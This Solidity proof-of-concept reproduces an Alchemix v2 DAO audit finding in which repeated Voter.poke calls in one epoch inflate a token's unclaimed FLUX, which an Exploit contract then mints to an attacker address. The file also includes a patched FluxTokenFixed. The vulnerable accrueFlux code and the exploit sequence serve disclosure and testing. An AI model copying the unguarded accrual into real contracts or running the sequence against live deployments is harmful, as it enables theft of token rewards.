// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Alchemix v2 DAO finding 38196:
// "Malicious user can steal FLUX token by abusing Voter.poke".
//
// Root cause (VERBATIM from src/FluxToken.sol @ commit f1007439):
//   FluxToken.accrueFlux() does `unclaimedFlux[_tokenId] += claimableFlux(...)`
//   with NO per-epoch / already-claimed tracking, and VotingEscrow.claimableFlux
//   returns the SAME positive voting-power-based entitlement on every call (it is
//   a pure view of current voting power and is never decremented). Voter.poke has
//   NO per-epoch call limit and, via _vote, calls FluxToken.accrueFlux each time.
//   A malicious veALCX holder therefore pokes repeatedly inside ONE epoch to
//   inflate unclaimedFlux without bound, then mints that inflated balance to
//   themselves via claimFlux -> over-mint / theft of FLUX yield.
//
// This file inlines the VERBATIM vulnerable FluxToken functions (accrueFlux,
// claimFlux, updateFlux) and the VERBATIM VotingEscrow.claimableFlux. The only
// doubles are the opaque out-of-scope boundaries:
//   * VoterDouble.poke() mirrors the real poke -> _vote -> accrueFlux path
//     (keeping accrueFlux's `msg.sender == voter` gate real).
//   * VotingEscrowDouble backs claimableFlux with a fixed voting power
//     (_balanceOfTokenAt) — the ve-checkpoint math is genuinely out of scope —
//     plus ownerOf / isApprovedOrOwner / a non-expired lock.
// The FluxToken over-accrual accounting bug itself is NOT mocked.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal, standard ERC20 base providing _mint/_burn/balanceOf. This is a
///      faithful stand-in for OpenZeppelin's ERC20 (FluxToken `is ERC20`); it is
///      NOT the vulnerable boundary — the bug lives in accrueFlux's accounting.
abstract contract ERC20Min {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Local interface for the ve boundary the FluxToken calls into.
interface IVotingEscrow {
    function claimableFlux(uint256 _tokenId) external view returns (uint256);
    function ownerOf(uint256 _tokenId) external view returns (address);
    function isApprovedOrOwner(address _spender, uint256 _tokenId) external view returns (bool);
    function epoch() external view returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — FluxToken. accrueFlux / updateFlux / claimFlux are
// byte-for-byte the audited source (src/FluxToken.sol L188-L212 @ f1007439).
// ─────────────────────────────────────────────────────────────────────────────
contract FluxToken is ERC20Min("Flux", "FLUX") {
    address public minter;
    address public voter;
    address public veALCX;
    address public admin;
    uint256 public deployDate;

    mapping(uint256 => uint256) public unclaimedFlux; // tokenId => amount of unclaimed flux

    constructor(address _minter) {
        require(_minter != address(0), "FluxToken: minter cannot be zero address");
        minter = _minter;
        voter = _minter;
        veALCX = _minter;
        admin = _minter;
        deployDate = block.timestamp;
    }

    /// @dev Verbatim admin setter — needed to wire the doubles.
    function setVoter(address _voter) external {
        require(msg.sender == admin, "not admin");
        require(_voter != address(0), "FluxToken: voter cannot be zero address");
        voter = _voter;
    }

    /// @dev Verbatim admin setter — needed to wire the doubles.
    function setVeALCX(address _veALCX) external {
        require(msg.sender == admin, "not admin");
        require(_veALCX != address(0), "FluxToken: veALCX cannot be zero address");
        veALCX = _veALCX;
    }

    function getUnclaimedFlux(uint256 _tokenId) external view returns (uint256) {
        return unclaimedFlux[_tokenId];
    }

    // ── VERBATIM src/FluxToken.sol L188-L192 ──
    /// @dev Verbatim audited source (see VERBATIM marker above).
    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount; // @> no claimed/per-epoch tracking: repeated pokes accumulate claimableFlux without bound
    }

    // ── VERBATIM src/FluxToken.sol L195-L199 ──
    /// @dev Verbatim audited source (see VERBATIM marker above).
    function updateFlux(uint256 _tokenId, uint256 _amount) external {
        require(msg.sender == voter, "not voter");
        require(_amount <= unclaimedFlux[_tokenId], "not enough flux");
        unclaimedFlux[_tokenId] -= _amount;
    }

    // ── VERBATIM src/FluxToken.sol L202-L212 ──
    /// @dev Verbatim audited source (see VERBATIM marker above).
    function claimFlux(uint256 _tokenId, uint256 _amount) external {
        require(unclaimedFlux[_tokenId] >= _amount, "amount greater than unclaimed balance");

        if (msg.sender != veALCX) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved");
        }

        unclaimedFlux[_tokenId] -= _amount;

        _mint(IVotingEscrow(veALCX).ownerOf(_tokenId), _amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract — accrueFlux credits claimableFlux at MOST once per epoch.
// Everything else is identical to FluxToken.
// ─────────────────────────────────────────────────────────────────────────────
contract FluxTokenFixed is ERC20Min("Flux", "FLUX") {
    address public minter;
    address public voter;
    address public veALCX;
    address public admin;
    uint256 public deployDate;

    mapping(uint256 => uint256) public unclaimedFlux;
    mapping(uint256 => uint256) public lastAccruedEpoch; // FIX: tracks the last epoch already accrued

    constructor(address _minter) {
        require(_minter != address(0), "FluxToken: minter cannot be zero address");
        minter = _minter;
        voter = _minter;
        veALCX = _minter;
        admin = _minter;
        deployDate = block.timestamp;
    }

    function setVoter(address _voter) external {
        require(msg.sender == admin, "not admin");
        require(_voter != address(0), "FluxToken: voter cannot be zero address");
        voter = _voter;
    }

    function setVeALCX(address _veALCX) external {
        require(msg.sender == admin, "not admin");
        require(_veALCX != address(0), "FluxToken: veALCX cannot be zero address");
        veALCX = _veALCX;
    }

    function getUnclaimedFlux(uint256 _tokenId) external view returns (uint256) {
        return unclaimedFlux[_tokenId];
    }

    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 epoch = IVotingEscrow(veALCX).epoch();
        // FIX: a token's claimableFlux is credited at most once per epoch.
        if (lastAccruedEpoch[_tokenId] >= epoch) {
            return;
        }
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
        lastAccruedEpoch[_tokenId] = epoch;
    }

    function claimFlux(uint256 _tokenId, uint256 _amount) external {
        require(unclaimedFlux[_tokenId] >= _amount, "amount greater than unclaimed balance");
        if (msg.sender != veALCX) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved");
        }
        unclaimedFlux[_tokenId] -= _amount;
        _mint(IVotingEscrow(veALCX).ownerOf(_tokenId), _amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VotingEscrow double — inlines the VERBATIM claimableFlux (src/VotingEscrow.sol
// L377-L385 @ f1007439). Only the opaque ve-checkpoint math (_balanceOfTokenAt)
// is doubled by returning a fixed voting power; ownerOf / isApprovedOrOwner /
// a non-expired lock are minimal faithful accessors.
// ─────────────────────────────────────────────────────────────────────────────
contract VotingEscrowDouble {
    struct LockedBalance {
        uint256 end;
    }

    uint256 internal immutable BPS = 10_000;
    uint256 public fluxPerVeALCX = 5000; // 5000 bps = 50%, matches VotingEscrow initializer

    mapping(uint256 => LockedBalance) public locked;

    address internal _owner;    // veALCX holder (attacker EOA)
    address internal _operator; // approved helper (the Exploit contract acting for the holder)
    uint256 internal _votingPower; // fixed _balanceOfTokenAt double

    constructor(address owner_, address operator_, uint256 votingPower_, uint256 tokenId_) {
        _owner = owner_;
        _operator = operator_;
        _votingPower = votingPower_;
        // Non-expired lock: end far in the future so claimableFlux never short-circuits.
        locked[tokenId_].end = type(uint256).max;
    }

    /// @dev Opaque out-of-scope ve-checkpoint math, doubled with a constant.
    function _balanceOfTokenAt(uint256, uint256) internal view returns (uint256) {
        return _votingPower;
    }

    // ── VERBATIM src/VotingEscrow.sol L377-L385 ──
    /// @dev Verbatim audited source (see VERBATIM marker above).
    function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }

        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
    }

    function ownerOf(uint256) external view returns (address) {
        return _owner;
    }

    function isApprovedOrOwner(address _spender, uint256) external view returns (bool) {
        return _spender == _owner || _spender == _operator;
    }

    /// @dev Constant epoch (single-block synthetic); the fix credits once per epoch.
    function epoch() external pure returns (uint256) {
        return 1;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Voter double — mirrors Voter.poke -> _vote -> IFluxToken(FLUX).accrueFlux.
// Real poke (src/Voter.sol L195-L212) has NO per-epoch call limit; every call
// re-accrues. accrueFlux's real `msg.sender == voter` gate is preserved because
// this contract IS the FluxToken's voter.
// ─────────────────────────────────────────────────────────────────────────────
interface IFluxAccruer {
    function accrueFlux(uint256 _tokenId) external;
}

contract VoterDouble {
    address public immutable flux;

    constructor(address _flux) {
        flux = _flux;
    }

    function poke(uint256 _tokenId) external {
        IFluxAccruer(flux).accrueFlux(_tokenId);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: one malicious veALCX holder pokes 3x in the SAME epoch,
// tripling unclaimedFlux, then claims -> mints 3x the fair single-epoch
// entitlement of FLUX to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant TOKEN_ID = 1;
    uint256 internal constant VOTING_POWER = 2 ether; // -> claimableFlux = 1 ether/epoch

    address public fluxAddr;
    address public veAddr;
    address public voterAddr;
    uint256 public tokenId = TOKEN_ID;

    // Exposed results.
    uint256 public fairSingleEpoch;
    uint256 public buggyUnclaimed;
    uint256 public attackerMinted;
    uint256 public excessStolen;

    constructor() {
        // deploy order: FluxToken(0) -> VotingEscrowDouble(1) -> VoterDouble(2)
        FluxToken flux = new FluxToken(address(this)); // minter=voter=veALCX=admin=Exploit
        VotingEscrowDouble ve = new VotingEscrowDouble(ATTACKER, address(this), VOTING_POWER, TOKEN_ID);
        VoterDouble voter = new VoterDouble(address(flux));

        // wire the real gates: FluxToken.voter -> VoterDouble, FluxToken.veALCX -> ve
        flux.setVeALCX(address(ve));
        flux.setVoter(address(voter));

        fluxAddr = address(flux);
        veAddr = address(ve);
        voterAddr = address(voter);
    }

    function run() external payable {
        FluxToken flux = FluxToken(fluxAddr);
        VotingEscrowDouble ve = VotingEscrowDouble(veAddr);
        VoterDouble voter = VoterDouble(voterAddr);

        // Fair single-epoch entitlement (what an honest one-time accrual yields).
        fairSingleEpoch = ve.claimableFlux(TOKEN_ID); // 1 ether

        // Abuse: poke repeatedly in ONE epoch — no per-epoch limit, no claimed tracking.
        voter.poke(TOKEN_ID);
        voter.poke(TOKEN_ID);
        voter.poke(TOKEN_ID);

        buggyUnclaimed = flux.getUnclaimedFlux(TOKEN_ID); // 3 ether

        // Mint the inflated balance to the veALCX owner (ATTACKER).
        flux.claimFlux(TOKEN_ID, buggyUnclaimed);

        attackerMinted = flux.balanceOf(ATTACKER);        // 3 ether
        excessStolen = attackerMinted - fairSingleEpoch;  // 2 ether over-mint

        // HARM: attacker minted strictly more than one fair epoch's entitlement.
        require(attackerMinted > fairSingleEpoch, "no over-mint occurred");
        require(attackerMinted == 3 * fairSingleEpoch, "expected 3x over-mint from 3 pokes");
    }
}
